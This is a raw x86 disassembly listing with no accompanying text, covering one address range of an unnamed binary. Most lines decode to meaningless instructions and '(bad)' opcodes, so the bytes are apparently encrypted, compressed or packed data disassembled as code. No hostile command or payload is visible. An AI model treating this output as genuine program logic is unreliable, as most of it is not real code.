  40c769:	fild   DWORD PTR [esi]
  40c76b:	shl    eax,0x59
  40c76e:	push   esp
  40c76f:	cli    
  40c770:	(bad)  
  40c771:	add    bh,BYTE PTR [ebp-0x64cb3553]
  40c777:	add    eax,0xa4972e52
  40c77c:	xchg   BYTE PTR [ecx],dh
  40c77e:	add    edx,edx
  40c780:	stos   DWORD PTR es:[edi],eax
  40c781:	mov    al,0x15
  40c783:	pop    ebx
  40c784:	test   BYTE PTR [eax-0x163a7e2b],dh
  40c78a:	pop    esp
  40c78b:	jl     0x40c7f1
  40c78d:	(bad)  
  40c78e:	dec    esp
  40c78f:	mov    bh,0x98
  40c791:	cmc    
  40c792:	or     dl,BYTE PTR [ecx-0x377e4652]
  40c798:	jno    0x40c78e
  40c79a:	aad    0x1b
  40c79c:	xor    BYTE PTR [esi+0x70],al
  40c79f:	xor    eax,0xc03240f8
  40c7a4:	(bad)  
  40c7a5:	adc    al,BYTE PTR [edx]
  40c7a7:	arpl   WORD PTR ds:0x8069a334,dx
  40c7ad:	inc    edx
  40c7ae:	mov    ah,0x4c
  40c7b0:	inc    edx
  40c7b1:	popa   
  40c7b2:	adc    al,0x7
  40c7b4:	and    DWORD PTR es:[edx],ebx
  40c7b7:	shr    DWORD PTR [edx-0x50f8c6b4],cl
  40c7bd:	dec    ebp
  40c7be:	stos   DWORD PTR es:[edi],eax
  40c7bf:	arpl   WORD PTR [esi+ecx*4+0x3c],cx
  40c7c3:	dec    esi
  40c7c4:	int3   
  40c7c5:	push   cs
  40c7c6:	or     eax,0x777b5c51
  40c7cb:	sbb    DWORD PTR [edx+ecx*1+0x2c],0xa0f041ac
  40c7d3:	push   esp
  40c7d4:	dec    ecx
  40c7d5:	adc    DWORD PTR [ecx+0xbf86ca7],ebx
  40c7db:	rcl    DWORD PTR [ebp-0x2dd6e630],1
  40c7e1:	push   esp
  40c7e2:	dec    esi
  40c7e3:	inc    eax
  40c7e4:	mov    cl,0x6a
  40c7e6:	inc    ebp
  40c7e7:	(bad)  
  40c7e8:	cld    
  40c7e9:	and    ah,BYTE PTR [edi]
  40c7eb:	sub    edx,eax
  40c7ed:	push   0xb7455c8
  40c7f2:	inc    ebp
  40c7f3:	(bad)  [eax+0x79]
  40c7f6:	xor    esi,DWORD PTR [ebx]
  40c7f8:	sahf   
  40c7f9:	xchg   ecx,eax
  40c7fa:	sbb    al,0xc5
  40c7fc:	add    al,BYTE PTR [edx+0x53]
  40c7ff:	call   0xf4c56e4
  40c804:	sbb    eax,0x6686716f
  40c809:	rol    DWORD PTR [edi-0x15],0x7
  40c80d:	fdiv   QWORD PTR ds:0x6c8a2289
  40c813:	in     al,0xc5
  40c815:	and    BYTE PTR [eax+0x6ca9bc7e],bl
  40c81b:	scas   eax,DWORD PTR es:[edi]
  40c81c:	dec    esi
  40c81d:	shl    DWORD PTR ds:0xc44ad07f,1
  40c823:	stos   BYTE PTR es:[edi],al
  40c824:	ror    ecx,1
  40c826:	mov    cl,0x32
  40c828:	in     eax,0x9f
  40c82a:	xchg   ebp,eax
  40c82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82c:	mov    edx,0x2f5aaa5
  40c831:	pushf  
  40c832:	out    dx,eax
  40c833:	scas   al,BYTE PTR es:[edi]
  40c834:	pop    eax
  40c835:	repnz daa 
  40c837:	fstp   TBYTE PTR ss:[ecx+0x74f9b7f]
  40c83e:	add    bh,BYTE PTR [eax+0x2f263e23]
  40c844:	push   esp
  40c845:	ins    DWORD PTR es:[edi],dx
  40c846:	sbb    esi,DWORD PTR [eax-0x18]
  40c849:	xor    edi,DWORD PTR [esi]
  40c84b:	adc    ebx,DWORD PTR [ecx+0x4295f471]
  40c851:	lods   eax,DWORD PTR ds:[esi]
  40c852:	stc    
  40c853:	xchg   edi,eax
  40c854:	sbb    al,BYTE PTR [ebx+0x3e]
  40c857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c858:	into   
  40c859:	lahf   
  40c85a:	(bad)  [ebp-0xcc3a05]
  40c860:	adc    esp,esp
  40c862:	sbb    al,0xcd
  40c864:	in     eax,0x71
  40c866:	sub    BYTE PTR [eax+0x74],ah
  40c869:	out    dx,al
  40c86a:	inc    ebp
  40c86b:	out    dx,eax
  40c86c:	(bad)  
  40c86d:	sti    
  40c86e:	add    BYTE PTR [ecx+ebp*4-0x35],al
  40c872:	sub    ecx,DWORD PTR [eax-0x78844d1f]
  40c878:	ja     0x40c88f
  40c87a:	or     al,0xd1
  40c87c:	push   es
  40c87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87e:	add    eax,0x17d4f217
  40c883:	ins    BYTE PTR es:[edi],dx
  40c884:	inc    bh
  40c886:	loop   0x40c880
  40c888:	sub    bh,0x72
  40c88b:	rcr    BYTE PTR [edi-0x75],1
  40c88e:	inc    ebp
  40c88f:	or     al,0x3
  40c891:	inc    ebp
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0xc5d2855c
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c8ac
  40c8c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8c8:	clc    
  40c8c9:	pop    esp
  40c8ca:	fwait
  40c8cb:	xor    DWORD PTR [ebx-0x2c],esi
  40c8ce:	cs clc 
  40c8d0:	fwait
  40c8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d2:	hlt    
  40c8d3:	xor    ch,ch
  40c8d5:	test   BYTE PTR [ebx],dl
  40c8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d8:	adc    eax,0xa39428ea
  40c8dd:	and    dl,BYTE PTR [ebx]
  40c8df:	push   ds
  40c8e0:	loope  0x40c91a
  40c8e2:	aas    
  40c8e3:	add    eax,0x1159838c
  40c8e8:	adc    bl,BYTE PTR [ebx]
  40c8ea:	loopne 0x40c95c
  40c8ec:	out    0x9f,al
  40c8ee:	enter  0xe3d0,0xf9
  40c8f2:	lods   al,BYTE PTR ds:[esi]
  40c8f3:	mov    ebp,0xdb56d091
  40c8f8:	loop   0x40c8f0
  40c8fa:	jo     0x40c887
  40c8fc:	pop    es
  40c8fd:	mov    al,ds:0x4f603dd4
  40c902:	dec    ebx
  40c903:	dec    BYTE PTR [ecx+0x59]
  40c906:	imul   edx,DWORD PTR [edi],0x21
  40c909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90a:	jnp    0x40c947
  40c90c:	call   0xe53e:0xa32e1f62
  40c913:	daa    
  40c914:	or     dh,BYTE PTR [ebp-0x2d]
  40c917:	inc    ecx
  40c918:	das    
  40c919:	sub    al,0x62
  40c91b:	pop    ecx
  40c91c:	jo     0x40c929
  40c91e:	mov    eax,ds:0xa28a2292
  40c923:	repz (bad) 
  40c925:	lock lea eax,[ebx+0x65e817f9]
  40c92c:	in     al,0x48
  40c92e:	sahf   
  40c92f:	out    dx,al
  40c930:	jp     0x40c8f1
  40c932:	scas   al,BYTE PTR es:[edi]
  40c933:	(bad)  
  40c934:	jmp    0xae6:0x1664ea4d
  40c93b:	xor    BYTE PTR [edx+0xb],dh
  40c93e:	adc    BYTE PTR [esi+0x38],bl
  40c941:	dec    ebp
  40c942:	adc    ebp,edx
  40c944:	pop    es
  40c945:	cwde   
  40c946:	sbb    al,0x95
  40c948:	ror    dh,1
  40c94a:	test   al,0x99
  40c94c:	(bad)  
  40c94d:	div    dl
  40c94f:	xchg   ebx,eax
  40c950:	and    BYTE PTR [edx+edx*2+0x3c],bl
  40c954:	inc    edx
  40c955:	mov    ds:0x70cceb2a,eax
  40c95a:	ret    
  40c95b:	arpl   WORD PTR [edi],di
  40c95d:	xchg   esp,eax
  40c95e:	cdq    
  40c95f:	mov    WORD PTR [ecx-0x80],ds
  40c962:	add    eax,0xbcf3c30b
  40c967:	ins    BYTE PTR es:[edi],dx
  40c968:	les    esi,FWORD PTR [eax-0x90a2b75]
  40c96e:	lods   eax,DWORD PTR ds:[esi]
  40c96f:	add    esp,ebp
  40c971:	jbe    0x40c929
  40c973:	and    ebx,DWORD PTR [ebp+0x36bb78b9]
  40c979:	mov    edi,DWORD PTR [bp+si-0xecc]
  40c97e:	sbb    bh,BYTE PTR [ebx]
  40c980:	out    dx,al
  40c981:	sbb    eax,0xd0405179
  40c986:	mov    bh,0x63
  40c988:	mov    ah,ch
  40c98a:	xor    esi,ebx
  40c98c:	pop    ebp
  40c98d:	mov    dh,0x5b
  40c98f:	sbb    dl,al
  40c991:	mov    edx,0xe9c5766c
  40c996:	dec    DWORD PTR ds:0xddc7a07b
  40c99c:	addr16 (bad) 
  40c99e:	cdq    
  40c99f:	xchg   edi,eax
  40c9a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9a1:	inc    esi
  40c9a2:	sub    eax,0xd5e022e4
  40c9a7:	inc    esi
  40c9a8:	xchg   ebx,eax
  40c9a9:	sahf   
  40c9aa:	ret    0x260d
  40c9ad:	add    al,0xcc
  40c9af:	(bad)  
  40c9b0:	mov    bl,0xc4
  40c9b2:	lock mov bh,0xea
  40c9b5:	push   cs
  40c9b6:	pop    es
  40c9b7:	and    edi,edx
  40c9b9:	jmp    0xc7e65941
  40c9be:	int3   
  40c9bf:	sahf   
  40c9c0:	nop
  40c9c1:	push   ecx
  40c9c2:	fs mov ebx,0x6c3c5a14
  40c9c8:	sbb    DWORD PTR [ebx-0x28ba26e1],esp
  40c9ce:	test   DWORD PTR [esi],esp
  40c9d0:	dec    esi
  40c9d1:	popf   
  40c9d2:	push   es
  40c9d3:	retf   
  40c9d4:	aam    0xb8
  40c9d6:	not    DWORD PTR [ebx+eax*8-0x49]
  40c9da:	shl    DWORD PTR [eax],1
  40c9dc:	dec    edi
  40c9dd:	into   
  40c9de:	addr16 gs push ds
  40c9e1:	adc    ah,BYTE PTR [eax]
  40c9e3:	push   0xffffffa0
  40c9e5:	xlat   BYTE PTR ds:[ebx]
  40c9e6:	sbb    edi,DWORD PTR [ebx]
  40c9e8:	les    esi,FWORD PTR ds:0x38e38d77
  40c9ee:	pop    eax
  40c9ef:	sahf   
  40c9f0:	loope  0x40c9d6
  40c9f2:	xchg   edx,eax
  40c9f3:	int3   
  40c9f4:	nop
  40c9f5:	das    
  40c9f6:	pop    esi
  40c9f7:	xchg   edi,eax
  40c9f8:	sub    dh,dh
  40c9fa:	adc    eax,0xeaf958bd
  40c9ff:	or     eax,0x1ae51e19
  40ca04:	js     0x40ca29
  40ca06:	and    al,0x49
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x118d54cf
  40ca1c:	cmp    BYTE PTR [eax-0xc],cl
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca5f
  40ca26:	mov    esp,DWORD PTR [edx]
  40ca28:	scas   al,BYTE PTR es:[edi]
  40ca29:	pop    edi
  40ca2a:	or     al,0xbe
  40ca2c:	cld    
  40ca2d:	ins    DWORD PTR es:[edi],dx
  40ca2e:	adc    DWORD PTR [ebx-0xa],edx
  40ca31:	into   
  40ca32:	arpl   WORD PTR [ebp+0x2],di
  40ca35:	mov    dh,0x16
  40ca37:	into   
  40ca38:	dec    esp
  40ca39:	test   eax,0x41ecbbeb
  40ca3e:	cmp    bl,cl
  40ca40:	data16 jno 0x40ca10
  40ca43:	push   ebp
  40ca44:	ror    ebx,cl
  40ca46:	loope  0x40ca76
  40ca48:	xchg   esp,eax
  40ca49:	lock mov edi,DWORD PTR [ebp-0x599d3c1d]
  40ca50:	add    eax,0x27f25da7
  40ca55:	aaa    
  40ca56:	mov    ebp,0xe8bba97a
  40ca5b:	pop    ebp
  40ca5c:	jbe    0x40ca10
  40ca5e:	or     bl,BYTE PTR [esi+0x2abf13b1]
  40ca64:	sbb    ebx,edi
  40ca66:	mov    bh,0xd3
  40ca68:	stos   BYTE PTR es:[edi],al
  40ca69:	push   0xa3216ea8
  40ca6e:	lods   eax,DWORD PTR ds:[esi]
  40ca6f:	movntq QWORD PTR [edx-0x43f0c003],mm6
  40ca76:	ror    dh,0x27
  40ca79:	or     eax,0x54c64923
  40ca7e:	cmp    al,0xd1
  40ca80:	or     al,0xf9
  40ca82:	mov    gs,esp
  40ca84:	je     0x40ca53
  40ca86:	imul   esp,DWORD PTR [edx+0x17],0x58ea0492
  40ca8d:	lods   al,BYTE PTR ds:[esi]
  40ca8e:	dec    esp
  40ca8f:	iret   
  40ca90:	lock push esp
  40ca92:	jle    0x40cafa
  40ca94:	mov    ds:0x9a6e6351,al
  40ca99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca9a:	inc    esp
  40ca9b:	(bad)
  40caa0:	pop    ecx
  40caa1:	loopne 0x40ca9f
  40caa3:	jmp    0x40caf9
  40caa5:	push   ebp
  40caa6:	sbb    DWORD PTR [eax-0x9],0x42f56cbc
  40caad:	mov    ch,cl
  40caaf:	push   cs
  40cab0:	mov    edx,0xbc8de9ec
  40cab5:	call   0x138a8be5
  40caba:	or     bh,BYTE PTR [esi+0x1bd604bd]
  40cac0:	outs   dx,BYTE PTR ds:[esi]
  40cac1:	ss pop ebx
  40cac3:	(bad)  
  40cac4:	es in  al,dx
  40cac6:	xchg   esp,eax
  40cac7:	jl     0x40caff
  40cac9:	bnd jae 0x40cae2
  40cacc:	loopne 0x40cae1
  40cace:	dec    ebp
  40cacf:	cdq    
  40cad0:	js     0x40cb08
  40cad2:	mov    eax,0x824c5780
  40cad7:	fdiv   DWORD PTR [eax+0x23e7e89f]
  40cadd:	jmp    0x17c:0x866aa86f
  40cae4:	test   al,0x8b
  40cae6:	push   ecx
  40cae7:	jae    0x40cb38
  40cae9:	inc    esp
  40caea:	and    ebx,esp
  40caec:	mov    bl,0x49
  40caee:	jns    0x40cb16
  40caf0:	jecxz  0x40caab
  40caf2:	lods   eax,DWORD PTR ds:[esi]
  40caf3:	cwde   
  40caf4:	aaa    
  40caf5:	das    
  40caf6:	sbb    al,0x5c
  40caf8:	mov    edi,0x26f145d2
  40cafd:	cdq    
  40cafe:	shr    DWORD PTR [ebp-0x5c97bd53],cl
  40cb04:	mov    eax,ds:0x619f4e68
  40cb09:	in     al,0x1c
  40cb0b:	sub    eax,esi
  40cb0d:	xchg   esi,eax
  40cb0e:	or     eax,edx
  40cb10:	push   0x751dff05
  40cb15:	xor    ah,al
  40cb17:	std    
  40cb18:	cld    
  40cb19:	and    BYTE PTR [esi+0x30],ah
  40cb1c:	mov    ebp,0xba4485b8
  40cb21:	leave  
  40cb22:	inc    esp
  40cb23:	push   edi
  40cb24:	jle    0x40cb47
  40cb26:	and    ah,BYTE PTR [edi]
  40cb28:	loop   0x40cb25
  40cb2a:	add    BYTE PTR [ecx-0x3a7b34bc],al
  40cb30:	setp   bl
  40cb33:	pop    edx
  40cb34:	sbb    DWORD PTR [edx],edi
  40cb36:	dec    ecx
  40cb37:	loop   0x40cba0
  40cb39:	mov    ax,WORD PTR [esi]
  40cb3c:	xchg   DWORD PTR [eax],eax
  40cb3e:	bound  ebx,QWORD PTR [edx+0x27f6f44d]
  40cb44:	push   ebp
  40cb45:	push   esp
  40cb46:	call   0xebb4e1fa
  40cb4b:	mov    eax,ds:0xed62796
  40cb50:	fwait
  40cb51:	(bad)  
  40cb52:	or     esi,DWORD PTR [esi]
  40cb54:	popa   
  40cb55:	xchg   ecx,eax
  40cb56:	daa    
  40cb57:	fiadd  DWORD PTR [ebx-0x1f]
  40cb5a:	fcom   st(5)
  40cb5c:	push   esi
  40cb5d:	jmp    0x40cb60
  40cb5f:	shl    DWORD PTR [ebx],0x15
  40cb62:	adc    eax,0x5b33dbb4
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbd2
  40cb8b:	inc    edx
  40cb8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb8d:	or     DWORD PTR [ecx],0xfffffff6
  40cb90:	jle    0x40cc10
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cbf0
  40cb97:	cmp    cl,BYTE PTR [edx*1+0x3304806c]
  40cb9e:	ret    
  40cb9f:	cld    
  40cba0:	mov    BYTE PTR [ecx-0x747f04e0],0xcb
  40cba7:	repz neg BYTE PTR [edx+0x719b8169]
  40cbae:	inc    edi
  40cbaf:	das    
  40cbb0:	mov    esi,0x87158cdd
  40cbb5:	cmp    al,0xa2
  40cbb7:	add    bh,BYTE PTR [eax-0x8]
  40cbba:	test   DWORD PTR [ebx-0x127f270d],ecx
  40cbc0:	ins    BYTE PTR es:[edi],dx
  40cbc1:	adc    BYTE PTR ds:0x74e0cff8,ah
  40cbc7:	push   ss
  40cbc8:	adc    esi,DWORD PTR [edx-0x23]
  40cbcb:	jmp    0x40cbbb
  40cbcd:	retf   
  40cbce:	mov    edi,0x8ba0cbc9
  40cbd3:	outs   dx,BYTE PTR ds:[esi]
  40cbd4:	jmp    0x40cb75
  40cbd6:	and    BYTE PTR [ecx],al
  40cbd8:	dec    ebx
  40cbd9:	mov    fs,eax
  40cbdb:	and    DWORD PTR [ebp-0xc],ecx
  40cbde:	in     al,dx
  40cbdf:	xlat   BYTE PTR ds:[ebx]
  40cbe0:	aas    
  40cbe1:	adc    BYTE PTR [esi-0x63],dh
  40cbe4:	xor    DWORD PTR [ebp-0x1e51e030],esp
  40cbea:	rol    BYTE PTR [ecx*8+0x106cc6d3],cl
  40cbf1:	mov    cl,0x5c
  40cbf3:	dec    edx
  40cbf4:	adc    al,0x8a
  40cbf6:	dec    esi
  40cbf7:	out    0x55,al
  40cbf9:	push   0xffffffa3
  40cbfb:	dec    ebp
  40cbfc:	adc    DWORD PTR [ebx+0x42e75a9a],0x2f
  40cc03:	test   DWORD PTR [esi-0x34],0x73916512
  40cc0a:	sub    dl,dl
  40cc0c:	aad    0xd1
  40cc0e:	shr    BYTE PTR [edi],cl
  40cc10:	cmp    eax,0xe2c099f1
  40cc15:	add    al,0x2b
  40cc17:	(bad)  
  40cc18:	cs sub eax,0x10d21edb
  40cc1e:	sbb    edi,ecx
  40cc20:	add    DWORD PTR [esp+esi*4],0x39
  40cc24:	cmp    DWORD PTR [ecx-0x362b0c2d],edi
  40cc2a:	mov    dh,0xfa
  40cc2c:	push   cs
  40cc2d:	icebp  
  40cc2e:	sub    DWORD PTR [edi-0x31],ebp
  40cc31:	aas    
  40cc32:	fs nop
  40cc34:	fcmovne st,st(3)
  40cc36:	scas   eax,DWORD PTR es:[edi]
  40cc37:	imul   ebx,DWORD PTR [eax-0x43804e0b],0x0
  40cc3e:	xor    eax,0xca9d6359
  40cc43:	mov    cl,0x8c
  40cc45:	mov    ds:0x3ee8c5fb,eax
  40cc4a:	out    0x18,al
  40cc4c:	dec    esp
  40cc4d:	mov    ecx,0x1800754
  40cc52:	shr    BYTE PTR [eax+0x7f],cl
  40cc55:	xchg   esp,eax
  40cc56:	(bad)  
  40cc57:	or     ebx,DWORD PTR [eax+0x6dd535f8]
  40cc5d:	repnz arpl WORD PTR [edi],bx
  40cc60:	pusha  
  40cc61:	or     edi,DWORD PTR [ebx]
  40cc63:	sbb    bh,al
  40cc65:	jae    0x40cce1
  40cc67:	xchg   ecx,eax
  40cc68:	xchg   ebp,eax
  40cc69:	add    al,BYTE PTR [esi-0x76]
  40cc6c:	xor    cl,dl
  40cc6e:	rcr    DWORD PTR [ecx-0x47],1
  40cc71:	pop    ds
  40cc72:	adc    ah,BYTE PTR [eax-0x3f]
  40cc75:	xchg   cl,cl
  40cc77:	adc    DWORD PTR [eax+ebp*2-0xd],0xffffff8f
  40cc7c:	dec    edx
  40cc7d:	mov    ch,0x91
  40cc7f:	jns    0x40cc0b
  40cc81:	hlt    
  40cc82:	test   al,0xcd
  40cc84:	xor    BYTE PTR [esi+0x31],0x91
  40cc88:	bound  eax,QWORD PTR [edx]
  40cc8a:	push   0xffffffed
  40cc8c:	and    al,0x9b
  40cc8e:	leave  
  40cc8f:	xlat   BYTE PTR ds:[ebx]
  40cc90:	xchg   ebx,eax
  40cc91:	sub    ebx,DWORD PTR [edx+0x11]
  40cc94:	push   ecx
  40cc95:	stos   BYTE PTR es:[edi],al
  40cc96:	pop    ebp
  40cc97:	arpl   WORD PTR [ecx],ax
  40cc99:	inc    esi
  40cc9a:	pop    ebx
  40cc9b:	mov    ebp,0xfc525ec7
  40cca0:	xor    eax,0xd00f2b41
  40cca5:	aad    0x49
  40cca7:	jno    0x40cc5a
  40cca9:	pop    ss
  40ccaa:	sub    bl,BYTE PTR [edx-0x6b]
  40ccad:	(bad)  
  40ccae:	loopne 0x40cc61
  40ccb0:	icebp  
  40ccb1:	aad    0x2
  40ccb3:	xor    dl,BYTE PTR [ebp+0x15]
  40ccb6:	es fwait
  40ccb8:	mov    ecx,0xba097b6a
  40ccbd:	test   al,0x45
  40ccbf:	clc    
  40ccc0:	rol    DWORD PTR [edi+0x34],1
  40ccc3:	sub    al,0xe4
  40ccc5:	outs   dx,BYTE PTR ds:[esi]
  40ccc6:	cmp    edi,esi
  40ccc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc9:	add    al,0x33
  40cccb:	push   cs
  40cccc:	mov    BYTE PTR [eax-0x6eb7e937],dh
  40ccd2:	dec    edi
  40ccd3:	pop    DWORD PTR [eax+0x458bffc0]
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x54ec1d3a
  40ccf1:	ins    BYTE PTR es:[edi],dx
  40ccf2:	xchg   edi,eax
  40ccf3:	(bad)  
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd5a
  40ccfd:	xchg   ebx,eax
  40ccfe:	into   
  40ccff:	fidivr WORD PTR [ecx-0x11]
  40cd02:	scas   eax,DWORD PTR es:[edi]
  40cd03:	mov    ch,BYTE PTR [eax+0x3d06dd5c]
  40cd09:	jo     0x40ccab
  40cd0b:	rcl    edi,1
  40cd0d:	scas   al,BYTE PTR es:[edi]
  40cd0e:	shr    DWORD PTR [eax+edx*2-0x41],0xe6
  40cd13:	jo     0x40ccc4
  40cd15:	adc    BYTE PTR [edx-0x2f],cl
  40cd18:	aad    0xa0
  40cd1a:	adc    al,0x77
  40cd1c:	test   eax,0x32d04f3b
  40cd21:	or     al,0x4
  40cd23:	mov    ds:0xeeaaae45,eax
  40cd28:	xchg   DWORD PTR [ebx+edi*1+0x1138e9b5],esp
  40cd2f:	pusha  
  40cd30:	jmp    0xfa335883
  40cd35:	cwde   
  40cd36:	and    eax,0x1925a0e5
  40cd3b:	and    BYTE PTR [esi+0x17462087],ch
  40cd41:	jmp    0xc5cc:0xb2a9cc5d
  40cd48:	and    eax,0xab6f06b0
  40cd4d:	mov    ecx,0x5ffe7a7f
  40cd52:	std    
  40cd53:	pop    ss
  40cd54:	inc    esi
  40cd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd56:	sbb    al,0xc4
  40cd58:	call   0x3aea:0x670cd204
  40cd5f:	push   ecx
  40cd60:	mov    DWORD PTR [edi],edx
  40cd62:	mov    ebx,0x867d5ff2
  40cd67:	mov    eax,0xfdce4cea
  40cd6c:	in     eax,dx
  40cd6d:	fsub   DWORD PTR [ebp-0x3d]
  40cd70:	push   es
  40cd71:	xchg   ebx,eax
  40cd72:	xchg   ebx,eax
  40cd73:	sbb    ah,BYTE PTR [eax-0x1d]
  40cd76:	ret    0xebc4
  40cd79:	in     al,dx
  40cd7a:	sbb    esp,DWORD PTR [ecx]
  40cd7c:	stos   DWORD PTR es:[edi],eax
  40cd7d:	or     BYTE PTR [esi+0x682e9cbb],al
  40cd83:	jnp    0x40cd86
  40cd85:	push   ebp
  40cd86:	gs in  al,0xfe
  40cd89:	in     eax,0x47
  40cd8b:	pop    ebp
  40cd8c:	xor    eax,0x9b5a70fa
  40cd91:	rol    DWORD PTR [esp+eax*2],1
  40cd94:	mov    eax,cs
  40cd96:	sbb    al,0xb2
  40cd98:	jne    0x40cd8b
  40cd9a:	aaa    
  40cd9b:	or     eax,0xb4594aa4
  40cda0:	pop    edi
  40cda1:	or     eax,0xaa132b6
  40cda6:	iret   
  40cda7:	sbb    BYTE PTR [eax-0x1507767e],ah
  40cdad:	or     DWORD PTR [edi-0x6978c983],0xffffffe0
  40cdb4:	arpl   WORD PTR [ebx+0x2d7c8ae1],bx
  40cdba:	xchg   esp,eax
  40cdbc:	cld    
  40cdbd:	mov    fs,WORD PTR [edi]
  40cdbf:	sahf   
  40cdc0:	jbe    0x40cd46
  40cdc2:	test   al,0x57
  40cdc4:	push   eax
  40cdc5:	pop    edx
  40cdc6:	jmp    0xca3f6df2
  40cdcb:	sub    al,BYTE PTR [ebp+0x8]
  40cdce:	mov    esi,0xddf590a3
  40cdd3:	jp     0x40ce3f
  40cdd5:	cmp    al,0xa5
  40cdd7:	fucomip st,st(2)
  40cdd9:	mov    eax,0x7fe18fcb
  40cdde:	repz or al,0x4
  40cde1:	mov    bh,0x5f
  40cde3:	push   ecx
  40cde4:	in     al,0x29
  40cde6:	push   edx
  40cde7:	adc    eax,0x4d1d1725
  40cdec:	scas   eax,DWORD PTR es:[edi]
  40cded:	xchg   BYTE PTR [ecx+0x20],ah
  40cdf0:	sub    eax,0x670e4615
  40cdf5:	sub    al,0xac
  40cdf7:	icebp  
  40cdf8:	mov    esi,0xb7756e03
  40cdfd:	dec    edx
  40cdfe:	leave  
  40cdff:	pop    ebp
  40ce00:	rol    BYTE PTR [ecx+0x66],0x63
  40ce04:	shl    BYTE PTR [edx],0x9c
  40ce07:	ja     0x40cdef
  40ce09:	shl    DWORD PTR [ecx+0x65],0x5a
  40ce0d:	push   ss
  40ce0e:	adc    edx,edx
  40ce10:	sub    ch,BYTE PTR [eax-0x67]
  40ce13:	fs jmp 0x2df6a858
  40ce19:	mov    ecx,DWORD PTR [edx]
  40ce1b:	int3   
  40ce1c:	ror    dh,1
  40ce1e:	lahf   
  40ce1f:	call   0xf8be:0xe0a0c0ed
  40ce26:	push   ds
  40ce27:	jmp    0x40cdc2
  40ce29:	clc    
  40ce2a:	inc    edi
  40ce2b:	xlat   BYTE PTR ds:[ebx]
  40ce2c:	jl     0x40cdf2
  40ce2e:	rol    DWORD PTR [ebx+0xd],cl
  40ce31:	add    ah,BYTE PTR [edx+0x48]
  40ce34:	enter  0x7a5c,0xb
  40ce38:	in     eax,dx
  40ce39:	loope  0x40ce42
  40ce3b:	mov    ebp,0xbac1331b
  40ce40:	popf   
  40ce41:	jb     0x40ce75
  40ce43:	add    BYTE PTR [ebx],al
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x7ad5331,eax
  40ce59:	xlat   BYTE PTR ds:[ebx]
  40ce5a:	xor    DWORD PTR [ebx+0x3f7e7e88],ecx
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ce39
  40ce64:	hlt    
  40ce65:	inc    edx
  40ce66:	dec    edx
  40ce67:	stc    
  40ce68:	ret    
  40ce69:	cld    
  40ce6a:	mov    dl,bh
  40ce6c:	sti    
  40ce6d:	mov    ebp,ecx
  40ce6f:	lfs    edx,FWORD PTR [edi-0x1]
  40ce73:	jno    0x40ce28
  40ce75:	loopne 0x40ce6d
  40ce77:	mov    al,0x55
  40ce79:	mov    dh,0x6d
  40ce7b:	jb     0x40ce4c
  40ce7d:	push   esi
  40ce7e:	jo     0x40ce3a
  40ce80:	stc    
  40ce81:	push   ebp
  40ce82:	mov    edx,0xdd7a1701
  40ce87:	jl     0x40ce4f
  40ce89:	xchg   ebp,eax
  40ce8a:	cmc    
  40ce8b:	cmp    dl,dl
  40ce8d:	sub    ebp,ebx
  40ce8f:	mov    esp,0xf0d3638f
  40ce94:	push   ebp
  40ce95:	shl    BYTE PTR [edx+0x7ce68ab0],0xcb
  40ce9c:	and    dh,BYTE PTR [eax+ecx*4-0x79b41a19]
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
